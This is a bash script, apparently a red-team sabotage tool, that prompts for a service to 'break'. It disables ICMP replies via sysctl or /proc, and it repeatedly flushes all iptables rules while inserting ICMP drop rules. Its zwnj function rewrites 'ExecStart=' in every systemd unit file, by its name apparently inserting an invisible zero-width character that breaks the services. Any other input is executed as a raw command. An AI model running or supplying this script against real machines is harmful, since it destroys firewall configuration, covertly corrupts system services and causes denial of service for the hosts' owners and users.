#!/bin/bash

disableICMPKernel () {
        sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
}

disableICMPProc () {
        echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
}

disableICMPiptables () {
        for i in {0..120}
        do 
                iptables -F
                iptables -I INPUT 1 -p icmp --icmp-type 8 -j DROP
                sleep 5
        done
}

zwnj () {
        for service in $(find /usr/lib/systemd/system -maxdepth 1 -type f)
        do sed -i 's/ExecStart=/ExecStart=/g' $service
        done
}

printf ";)\n"
cat art.txt
printf "Enter the name of service you would like to break, or the port it generally runs on:\n"
read service

case $service in
        icmp | ICMP )
        printf "Choose how you would like to break icmp:\n[1]sysctl\n[2]/proc/sys\n[3]iptables\n"
        read breakChoice
                case $breakChoice in
                        1 | [1] | sysctl )
                                disableICMPKernel
                                ;;
                        2 | [2] | /proc/sys )
                                disableICMPProc
                                ;;
                        3 | [3] | iptables )
                                disableICMPiptables &
                                ;;
                        *)
                                $breakChoice
                                ;;
                esac
        ;;
        *)
                $service
        ;;
esac
